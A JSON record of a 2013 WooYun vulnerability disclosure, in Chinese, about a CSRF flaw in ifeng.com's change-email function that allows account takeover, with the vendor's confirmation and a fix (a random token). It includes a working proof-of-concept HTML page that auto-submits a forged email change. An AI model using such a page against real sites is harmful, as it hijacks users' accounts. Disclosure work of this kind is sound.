{"id": 13237, "wybug_id": "wooyun-2013-019914", "wybug_title": "[CSRF系列]2-凤凰网任意账号劫持", "wybug_corp": "凤凰网", "wybug_author": "VIP", "wybug_date": "2013-03-12 11:41", "wybug_open_date": "2013-04-26 11:41", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-04-26：\t细节向公众公开  简要描述： 咱也来连载了 详细说明：  凤凰网修改邮箱处存在csrf，更改掉了邮箱，账号不就控制了吗？但是，邮箱这个比较特殊，需要唯一性。于是，我们可以用 js从数组中随机抽取一个。另外，凤凰网修改邮箱的请求中还需要一个\"oe\"的参数（old email)，我还以为用不了的，可是这一项可以随便填，于是直接无视了。   漏洞证明：  POC:\n<html><body><form name=\"csrf\" action=\"http://my.ifeng.com/?_c=user&_a=do-edit-email\" method=\"POST\"><input type=text name=oe value=\"root@wooyun.org\"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7@wooyun.org','root8@wooyun.org','root9@wooyun.org','root10@wooyun.org'];function Rand(arr, len) {     arr.sort(function () {         return Math.random()-0.5;     });     return arr.slice(0, len); }//alert(Rand(email,1));document.write(\"<input type=text name=e value=\"+Rand(email,1)+\"></input>\");</script><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.csrf.submit();</script></body></html>\n\nhttp://email.smtp.yupage.com/ifeng.htm\n\n\n   修复方案：  在请求中加入随机的token求20rank，求礼物。   版权声明：转载请注明来源 VIP@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-03-12 12:21 厂商回复： 开发人员已确认，该接口设计显然存在重大风险，已按排人处理。 最新状态： 2013-03-12：已修复  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}